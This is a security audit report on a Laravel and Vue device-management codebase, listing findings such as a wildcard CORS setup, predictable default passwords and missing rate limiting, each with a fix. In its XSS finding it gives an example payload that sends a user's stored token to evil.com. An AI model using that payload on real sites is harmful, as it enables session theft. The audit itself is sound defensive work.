# 🔒 ZERO-TRUST SECURITY AUDIT REPORT

**Project:** Laravel Device Management System  
**Audit Date:** 2026-01-22  
**Auditor Role:** Senior Cybersecurity Auditor & Code Forensics Expert  
**Methodology:** Zero-Trust, Adversarial Analysis

---

## EXECUTIVE SUMMARY

This comprehensive security audit examined the entire codebase (Backend: Laravel/PHP, Frontend: Vue.js) under a zero-trust assumption. The analysis covered dependency forensics, malicious execution patterns, secrets management, CI/CD security, and data leak detection.

**Overall Risk Level:** 🟡 **MEDIUM** (Several critical issues require immediate attention)

---

## 🔴 CRITICAL RED FLAGS

### 1. **CORS Configuration - Complete Exposure**

**File:** `BACKEND/config/cors.php`  
**Lines:** 20-28  
**Severity:** 🔴 CRITICAL

```php
'allowed_methods' => ['*'],
'allowed_origins' => ['*'],
'allowed_headers' => ['*'],
'exposed_headers' => ['*'],
'supports_credentials' => true,
```

**Impact:**

- **ANY domain** can make authenticated requests to your API
- Credentials (cookies, auth headers) are sent cross-origin
- Enables CSRF attacks, session hijacking, and data exfiltration
- An attacker can host a malicious site and steal user data

**Exploit Scenario:**

1. Attacker creates `evil.com` with JavaScript that calls your API
2. Victim visits `evil.com` while logged into your app
3. Attacker's script reads victim's data, performs actions as victim
4. Complete account takeover possible

**Remediation:**

```php
'allowed_origins' => [
    env('FRONTEND_URL', 'http://localhost:5173'),
    // Add production frontend URL
],
'allowed_methods' => ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
'allowed_headers' => ['Content-Type', 'Authorization', 'X-Requested-With'],
'exposed_headers' => [],
```

---

### 2. **Weak Default Password Pattern**

**Files:**

- `BACKEND/app/Services/UserService.php` (lines 98-99, 121-122)
- `BACKEND/app/Http/Controllers/Api/Admin/UserController.php` (line 58)

**Severity:** 🔴 CRITICAL

```php
// UserService.php
$cleanName = sanitizeNameForPassword($user->name);
$data['password'] = bcrypt($cleanName . "@123");

// UserController.php
'password' => bcrypt($request->name . "123"),
```

**Impact:**

- Predictable passwords for all users
- "nguyenvana@123" or "nguyenvana123" for user "Nguyễn Văn A"
- Attackers can brute-force accounts knowing the pattern
- Mass account compromise if pattern is discovered

**Exploit Scenario:**

1. Attacker obtains user list (names/emails)
2. Generates passwords using same sanitization logic
3. Automated login attempts succeed
4. Access to all accounts with default passwords

**Remediation:**

```php
// Generate cryptographically secure random passwords
use Illuminate\Support\Str;

$randomPassword = Str::random(16); // Or use Str::password(12)
$data['password'] = bcrypt($randomPassword);

// Send password via secure channel (email with reset link)
// Force password change on first login
```

---

### 3. **XSS Vulnerability in Pagination Component**

**File:** `FONTEND/src/components/common/Pagination.vue`  
**Line:** 6  
**Severity:** 🔴 CRITICAL

```vue
<button
  v-html="link.label"
  @click="goTo(link.url)"
```

**Impact:**

- Unsanitized HTML rendering from backend data
- If backend is compromised or returns malicious pagination labels
- Stored XSS attack vector
- Can steal tokens, session data, perform actions as user

**Exploit Scenario:**

1. Attacker finds way to inject malicious pagination data
2. Label contains: `<img src=x onerror="fetch('https://evil.com?token='+localStorage.getItem('token'))">`
3. User views paginated page
4. Token exfiltrated to attacker's server

**Remediation:**

```vue
<!-- Use text interpolation instead -->
<button
  {{ link.label }}
  @click="goTo(link.url)"
```

Or sanitize with DOMPurify if HTML is required:

```javascript
import DOMPurify from 'dompurify';
// In computed or method
sanitizedLabel() {
  return DOMPurify.sanitize(this.link.label);
}
```

---

### 4. **JWT Secret Not Enforced**

**File:** `BACKEND/config/jwt.php`  
**Line:** 28  
**Severity:** 🔴 CRITICAL

```php
'secret' => env('JWT_SECRET'),
```

**Issue:**

- No validation that JWT_SECRET exists
- If `.env` is missing or JWT_SECRET is empty, tokens may be signed with empty string
- Allows token forgery

**Verification Needed:**
Check if `JWT_SECRET` is set in `.env` file (blocked by gitignore, but must verify in production)

**Remediation:**

```php
'secret' => env('JWT_SECRET') ?: throw new \RuntimeException('JWT_SECRET must be set'),
```

Add to deployment checklist:

```bash
php artisan jwt:secret  # Generate if not exists
```

---

## 🟠 SUSPICIOUS ITEMS

### 5. **Raw SQL Queries - SQL Injection Risk**

**Files:**

- `BACKEND/app/Services/Dashboard/AdminDashboardService.php` (lines 42-252)
- `BACKEND/app/Services/Dashboard/StaffDashboardService.php`
- `BACKEND/app/Services/Dashboard/BorrowerDashboardService.php`

**Severity:** 🟠 HIGH

**Current Code:**

```php
$trends = DB::select("
    SELECT
        DATE_FORMAT(created_at, '%Y-%m') as month,
        COUNT(*) as total_borrows
    FROM borrows
    WHERE created_at >= DATE_SUB(NOW(), INTERVAL 6 MONTH)
    GROUP BY DATE_FORMAT(created_at, '%Y-%m')
");
```

**Assessment:**

- Currently using static queries (no user input)
- **SAFE** in current implementation
- **RISK:** If future developer adds parameters without proper binding

**Evidence:**
All queries reviewed are parameterless. No immediate threat, but poor practice.

**Recommendation:**
Migrate to Query Builder for consistency:

```php
$trends = DB::table('borrows')
    ->selectRaw("DATE_FORMAT(created_at, '%Y-%m') as month, COUNT(*) as total_borrows")
    ->where('created_at', '>=', now()->subMonths(6))
    ->groupByRaw("DATE_FORMAT(created_at, '%Y-%m')")
    ->get();
```

---

### 6. **localStorage for Sensitive Data**

**File:** `FONTEND/src/stores/authStore.js`  
**Lines:** 8-9, 16-24  
**Severity:** 🟠 MEDIUM-HIGH

```javascript
const user = ref(JSON.parse(localStorage.getItem("user")) || null);
const token = ref(localStorage.getItem("token") || null);
```

**Issues:**

- JWT tokens in localStorage are vulnerable to XSS
- If any XSS exists, attacker can steal tokens
- No HttpOnly protection (unlike cookies)

**Why Suspicious:**

- Combined with XSS vulnerability (#3), this is a critical chain
- Any script injection can exfiltrate tokens

**Recommendation:**

1. **Short-term:** Ensure all XSS vulnerabilities are patched
2. **Long-term:** Consider httpOnly cookies for tokens:

```javascript
// Backend sets httpOnly cookie
return response()->json($data)->cookie(
    'auth_token', $token, 60, '/', null, true, true
);

// Frontend: axios automatically sends cookies
// No localStorage needed
```

---

### 7. **Missing Input Validation on Role Middleware**

**File:** `BACKEND/app/Http/Middleware/RoleMiddleware.php`  
**Lines:** 18-26  
**Severity:** 🟠 MEDIUM

```php
public function handle(Request $request, Closure $next, ...$roles): Response
{
    try {
        $user = auth('api')->user();

        if (!in_array($user->role, $roles)) {
            return response()->json(['error' => 'Forbidden'], 403);
        }
    } catch (\Exception $e) {
        return response()->json(['message' => 'Unauthorized'], 401);
    }

    return $next($request);
}
```

**Issues:**

- Catches ALL exceptions, masking potential security issues
- No null check on `$user` before accessing `->role`
- Generic error messages leak no info (good), but no logging

**Recommendation:**

```php
public function handle(Request $request, Closure $next, ...$roles): Response
{
    $user = auth('api')->user();

    if (!$user) {
        Log::warning('Unauthenticated access attempt', [
            'ip' => $request->ip(),
            'route' => $request->path()
        ]);
        return response()->json(['message' => 'Unauthorized'], 401);
    }

    if (!in_array($user->role, $roles)) {
        Log::warning('Unauthorized role access', [
            'user_id' => $user->id,
            'required_roles' => $roles,
            'user_role' => $user->role
        ]);
        return response()->json(['error' => 'Forbidden'], 403);
    }

    return $next($request);
}
```

---

## 🟡 VULNERABILITIES / WEAK PRACTICES

### 8. **No Rate Limiting on Authentication**

**File:** `BACKEND/routes/api.php`  
**Lines:** 164-166  
**Severity:** 🟡 MEDIUM

```php
Route::prefix('auth')->group(function () {
    Route::post('/login', [AuthController::class, 'login']);
    Route::post('/register', [AuthController::class, 'register']);
```

**Issue:**

- No rate limiting on login endpoint
- Enables brute-force attacks
- Combined with weak password pattern (#2), this is critical

**Recommendation:**

```php
Route::prefix('auth')->group(function () {
    Route::post('/login', [AuthController::class, 'login'])
        ->middleware('throttle:5,1'); // 5 attempts per minute
    Route::post('/register', [AuthController::class, 'register'])
        ->middleware('throttle:3,1');
```

---

### 9. **Missing CSRF Protection**

**Severity:** 🟡 MEDIUM

**Assessment:**

- API uses JWT (stateless), CSRF protection not applicable
- **BUT:** If `supports_credentials: true` in CORS (#1), cookies may be used
- If cookies are used, CSRF is required

**Current State:** Not vulnerable (JWT-only)  
**Risk:** Becomes vulnerable if cookies are added without CSRF tokens

**Recommendation:**

- Keep JWT-only authentication
- If adding cookies, implement CSRF protection

---

### 10. **No Security Headers**

**Severity:** 🟡 MEDIUM

**Missing Headers:**

- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `X-XSS-Protection: 1; mode=block`
- `Strict-Transport-Security` (HSTS)
- `Content-Security-Policy`

**Recommendation:**
Add middleware or configure web server:

```php
// app/Http/Middleware/SecurityHeaders.php
public function handle($request, Closure $next)
{
    $response = $next($request);

    $response->headers->set('X-Content-Type-Options', 'nosniff');
    $response->headers->set('X-Frame-Options', 'DENY');
    $response->headers->set('X-XSS-Protection', '1; mode=block');
    $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');

    return $response;
}
```

---

### 11. **Dependency Audit**

#### Backend (PHP/Composer)

**Analyzed:** `composer.json` and `composer.lock`

✅ **CLEAN - No Critical Issues Found**

**Dependencies:**

- `laravel/framework: ^12.0` - Latest major version ✅
- `tymon/jwt-auth: ^2.2` - Maintained, reputable ✅
- `maatwebsite/excel: ^3.1` - Popular, well-maintained ✅
- `barryvdh/laravel-dompdf: ^3.1` - Trusted Laravel package ✅
- `cloudinary-labs/cloudinary-laravel: ^3.0` - Official Cloudinary package ✅
- `spatie/laravel-activitylog: ^4.10` - Highly reputable ✅
- `pusher/pusher-php-server: ^7.2` - Official Pusher SDK ✅

**Notes:**

- All packages from reputable sources
- No typosquatting detected
- No git+ URLs or direct tarballs
- Version constraints are reasonable

**Recommendations:**

```bash
# Regular dependency audits
composer audit
composer outdated
```

#### Frontend (JavaScript/npm)

**Analyzed:** `FONTEND/package.json`

✅ **CLEAN - No Critical Issues Found**

**Dependencies:**

- `vue: ^3.5.18` - Latest stable ✅
- `vue-router: ^4.5.1` - Official Vue package ✅
- `pinia: ^3.0.4` - Official Vue state management ✅
- `axios: ^1.12.2` - Widely used, maintained ✅
- `flowbite: ^3.1.2` - Reputable UI library ✅
- `chart.js: ^4.5.1` - Popular charting library ✅
- `pusher-js: ^8.4.0` - Official Pusher client ✅

**Notes:**

- All packages are well-known and maintained
- No suspicious or obscure packages
- Versions are current

**Recommendations:**

```bash
# Regular audits
npm audit
npm outdated
```

---

### 12. **No Malicious Code Detected**

**Scanned for:**

- `eval()` / `exec()` / `shell_exec()` - ❌ Not found in application code
- `base64_decode()` - ❌ Not found
- `unserialize()` - ❌ Not found
- `file_get_contents()` / `file_put_contents()` - ❌ Not found in app code
- Dynamic imports / `new Function()` - ❌ Not found
- Obfuscated code - ❌ None detected

**Conclusion:** No evidence of backdoors, malware, or obfuscated malicious code.

---

### 13. **Secrets Management**

**✅ GOOD PRACTICES OBSERVED:**

- `.env` files properly gitignored
- `.env.example` provided without secrets
- No hardcoded credentials found in code
- JWT secret loaded from environment

**⚠️ RECOMMENDATIONS:**

1. **Verify Production `.env`:**
   - Ensure `JWT_SECRET` is set and strong
   - Check `APP_KEY` is generated
   - Verify database credentials are secure

2. **Add to deployment checklist:**

```bash
# Generate secrets if not exists
php artisan key:generate
php artisan jwt:secret

# Verify critical env vars
php artisan tinker
>>> env('JWT_SECRET') !== null  // Must be true
>>> env('APP_KEY') !== null     // Must be true
```

3. **Consider secrets management:**
   - Use AWS Secrets Manager / Azure Key Vault for production
   - Rotate JWT secrets periodically

---

## ✅ REMEDIATION PLAN

### Priority 1: IMMEDIATE (Deploy within 24 hours)

1. **Fix CORS Configuration**
   - File: `BACKEND/config/cors.php`
   - Change: Restrict `allowed_origins` to specific domains
   - Test: Verify frontend still works, unauthorized domains blocked

2. **Fix XSS in Pagination**
   - File: `FONTEND/src/components/common/Pagination.vue`
   - Change: Replace `v-html` with text interpolation
   - Test: Verify pagination displays correctly

3. **Add Rate Limiting**
   - File: `BACKEND/routes/api.php`
   - Change: Add throttle middleware to auth routes
   - Test: Verify login attempts are limited

### Priority 2: HIGH (Deploy within 1 week)

4. **Fix Password Generation**
   - Files: `UserService.php`, `UserController.php`
   - Change: Generate random passwords, force reset on first login
   - Migration: Reset all existing default passwords

5. **Add Security Headers**
   - Create: `SecurityHeaders` middleware
   - Apply: To all routes
   - Test: Verify headers in browser dev tools

6. **Verify JWT Secret**
   - Check: Production `.env` has strong JWT_SECRET
   - Add: Runtime validation in `config/jwt.php`

### Priority 3: MEDIUM (Deploy within 1 month)

7. **Migrate Raw SQL to Query Builder**
   - Files: All Dashboard services
   - Change: Use Laravel Query Builder
   - Test: Verify dashboard statistics unchanged

8. **Add Security Logging**
   - File: `RoleMiddleware.php`
   - Change: Log unauthorized access attempts
   - Monitor: Set up alerts for suspicious activity

9. **Implement Token Refresh Strategy**
   - Consider: Short-lived access tokens (15 min)
   - Implement: Refresh token rotation
   - Benefit: Limit damage if token is stolen

### Priority 4: ONGOING

10. **Dependency Audits**

```bash
# Weekly
composer audit
npm audit

# Monthly
composer outdated
npm outdated
```

11. **Code Reviews**

- All PRs must be reviewed for security
- Use checklist from this audit

12. **Penetration Testing**

- Quarterly external security assessment
- Annual full penetration test

---

## 🛠️ RECOMMENDED TOOLING

### SAST (Static Analysis)

```bash
# PHP
composer require --dev phpstan/phpstan
composer require --dev vimeo/psalm

# JavaScript
npm install --save-dev eslint eslint-plugin-security
```

### Dependency Scanning

```bash
# Automated
composer audit
npm audit

# Advanced
npm install -g snyk
snyk test
```

### Secret Scanning

```bash
# Pre-commit hook
npm install --save-dev @commitlint/cli
# Add git-secrets or truffleHog
```

### Runtime Protection

- **WAF:** Cloudflare, AWS WAF
- **Monitoring:** Sentry, LogRocket
- **SIEM:** Splunk, ELK Stack

---

## 📋 VERIFICATION CHECKLIST

After implementing fixes, verify:

- [ ] CORS allows only trusted origins
- [ ] XSS vulnerability patched (pagination)
- [ ] Rate limiting active on auth endpoints
- [ ] Passwords are randomly generated
- [ ] Security headers present in responses
- [ ] JWT_SECRET is set and strong
- [ ] No secrets in git history
- [ ] Dependencies are up to date
- [ ] `composer audit` shows no vulnerabilities
- [ ] `npm audit` shows no critical/high issues
- [ ] Logging captures security events
- [ ] Monitoring alerts are configured

---

## 🎯 CONCLUSION

**Overall Assessment:** The codebase shows **good security fundamentals** but has **several critical misconfigurations** that must be addressed immediately.

**Positive Findings:**

- ✅ No malware or backdoors detected
- ✅ Dependencies are from reputable sources
- ✅ Secrets properly excluded from version control
- ✅ JWT authentication implemented correctly
- ✅ Role-based access control in place

**Critical Issues:**

- 🔴 CORS misconfiguration (complete exposure)
- 🔴 Weak password generation pattern
- 🔴 XSS vulnerability in pagination
- 🔴 JWT secret validation missing

**Risk Level After Remediation:** 🟢 LOW (if all Priority 1 & 2 items addressed)

**Estimated Remediation Time:**

- Priority 1: 4-6 hours
- Priority 2: 2-3 days
- Priority 3: 1-2 weeks

---

## 📞 NEXT STEPS

1. **Review this report** with development team
2. **Create tickets** for each remediation item
3. **Implement Priority 1 fixes** immediately
4. **Schedule security review** after fixes deployed
5. **Establish security practices** for ongoing development

**Questions or clarifications needed?** Flag specific sections for discussion.

---

**Report Generated:** 2026-01-22  
**Auditor:** Senior Cybersecurity Auditor (Zero-Trust Mode)  
**Methodology:** Comprehensive code forensics, dependency analysis, threat modeling
